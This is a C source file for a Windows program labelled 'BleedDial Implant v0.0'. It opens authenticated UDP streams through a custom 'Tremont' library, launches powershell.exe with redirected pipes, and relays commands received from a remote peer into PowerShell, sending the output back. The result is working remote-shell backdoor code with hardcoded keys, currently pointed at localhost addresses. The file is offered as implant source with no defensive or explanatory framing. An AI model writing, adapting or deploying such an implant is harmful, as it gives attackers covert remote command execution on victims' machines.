#include<stdio.h>

#include<winsock2.h>
#include<WS2tcpip.h>

#include "tremont.h"

#pragma comment(lib, "Ws2_32.lib")

void init_winsock() {
    printf("Initiallizing Winsock...\n");
    WSADATA wsa_data;
    int startup_result = WSAStartup(MAKEWORD(2, 2), &wsa_data);

    if (startup_result != 0) {
        perror("Unable to initialize Winsock!\n");
        exit(-1);
    }
}

void setup_socket(SOCKET* sock) {
    struct addrinfo* res = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_protocol = IPPROTO_UDP;
    int addr_info_res = getaddrinfo("127.0.0.1", "7777", &hints, &res);
    if (addr_info_res != 0) {
        perror("Invaid address!\n");
        exit(-1);
    }

    *sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (*sock == INVALID_SOCKET) {
        perror("Invalid socket!");
        exit(-1);
    }

    int bind_result = bind(*sock, res->ai_addr, (int)res->ai_addrlen);
    if (bind_result == SOCKET_ERROR) {
        perror("Unable to bind socket!");
        exit(-1);
    }

    freeaddrinfo(res);
}

void setup_tremont(SOCKET* sock, Tremont_Nexus** nexus) {
    int res = 0;

    res = tremont_init_nexus(nexus);
    if (res != 0) {
        perror("Unable to initialize Tremont nexus!");
        exit(-1);
    }

    char key[] = "lets learn about IELR(1) parser generators";
    res = tremont_key_nexus(key, sizeof(key), *nexus);
    if (res != 0) {
        perror("Unable to key Tremont nexus!");
        exit(-1);
    }

    res = tremont_bind_nexus(*sock, *nexus);
    if (res != 0) {
        perror("Unable to bind Tremont nexus!");
        exit(-1);
    }
}

struct addrinfo* get_remote_addrinfo() {
    struct addrinfo* remote_info;
    struct addrinfo remote_hint;

    ZeroMemory(&remote_hint, sizeof(remote_hint));

    remote_hint.ai_family = AF_INET;
    remote_hint.ai_socktype = SOCK_DGRAM;
    remote_hint.ai_protocol = IPPROTO_UDP;
    int addr_info_res = getaddrinfo("127.0.0.1", "9999", &remote_hint, &remote_info);
    if (addr_info_res != 0) {
        perror("Invaid remote address!\n");
        exit(-1);
    }

    return remote_info;
}

struct powershell_info {
    PROCESS_INFORMATION proc_info;
    HANDLE child_out_rd;
    HANDLE child_out_wr;
    HANDLE child_in_rd;
    HANDLE child_in_wr;
};

int _init_powershell_proc(struct powershell_info* info) {
    SECURITY_ATTRIBUTES sec_attr;
    sec_attr.nLength = sizeof(sec_attr);
    sec_attr.bInheritHandle = TRUE;
    sec_attr.lpSecurityDescriptor = NULL;

    /* Connect the output from the process to a file descriptor */
    BOOL res = FALSE;
    res = CreatePipe(
        &info->child_out_rd,
        &info->child_out_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_out_rd,
        HANDLE_FLAG_INHERIT,
        0
    );

    /* Connect the input from the process to a file descriptor */
    res = CreatePipe(
        &info->child_in_rd,
        &info->child_in_wr,
        &sec_attr,
        0
    );
    if (res == FALSE) return -1;
    SetHandleInformation(
        info->child_in_wr,
        HANDLE_FLAG_INHERIT,
        0
    );
    
    STARTUPINFO startup_info;
    ZeroMemory(&startup_info, sizeof(startup_info));
    
    startup_info.cb = sizeof(STARTUPINFO);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdError = info->child_out_wr;
    startup_info.hStdOutput = info->child_out_wr;
    startup_info.hStdInput = info->child_in_rd;

    ZeroMemory(&info->proc_info, sizeof(PROCESS_INFORMATION));

    wchar_t cmd[] = L"powershell.exe";

    res = CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &startup_info,
        &info->proc_info
    );
    if (res == FALSE) return -1;
    
    return 0;
}

void _cleanup_powershell(struct powershell_info* info) {
    CloseHandle(info->proc_info.hProcess);
    CloseHandle(info->proc_info.hThread);
    CloseHandle(info->child_out_rd);
    CloseHandle(info->child_out_wr);
    CloseHandle(info->child_in_rd);
    CloseHandle(info->child_in_wr);
}

void implant_powershell(Tremont_Nexus* nexus) {
    int res = -1;

    char key[] = "cardstock's mom";
    tremont_auth_stream(7777, key, sizeof(key), nexus);

    res = tremont_accept_stream(7777, 0, nexus);

    struct powershell_info info;
    res = _init_powershell_proc(&info);
    if (res != 0) {
        perror("Unable to start Powershell!\n");
        exit(-1);
    }

    tremont_opts_stream(7777, OPT_NONBLOCK, 1, nexus);

    char temp_recv[255];
    char temp_out[255];
    int written = 0;
    int recvd = 0;
    int avail = 0;
    int read = 0;

    while (1) {
        if (WaitForSingleObject(
                info.proc_info.hProcess, 0) == WAIT_OBJECT_0) {
            break;
        }
        if (tremont_poll_stream(7777, nexus) == -1) break;
        memset(temp_recv, 0, sizeof(temp_recv));
        recvd = tremont_recv(7777, temp_recv, sizeof(temp_recv), nexus);

        if (recvd > 0) {
            WriteFile(info.child_in_wr, temp_recv, recvd, &written, NULL);
        }
        
        PeekNamedPipe(
            info.child_out_rd,
            NULL,
            0,
            NULL,
            &avail,
            NULL
        );

        if (avail > 0) {
            ReadFile(info.child_out_rd, temp_out, sizeof(temp_out), &read, NULL);
            tremont_send(7777, temp_out, read, nexus);
        }
    }

    _cleanup_powershell(&info);
}

int main() {
    printf("BleedDial Implant v0.0\n");

    init_winsock();

    SOCKET sock;
    setup_socket(&sock);

    Tremont_Nexus* nexus;
    setup_tremont(&sock, &nexus);

    tremont_set_size(300, nexus);

    char password[] = "badapple1998";
    tremont_auth_stream(9999, password, sizeof(password), nexus);

    struct addrinfo* remote_addrinfo = get_remote_addrinfo();
    tremont_req_stream(9999, remote_addrinfo->ai_addr, 0, nexus);
    freeaddrinfo(remote_addrinfo);

    implant_powershell(nexus);

    getchar();
    return 0;
}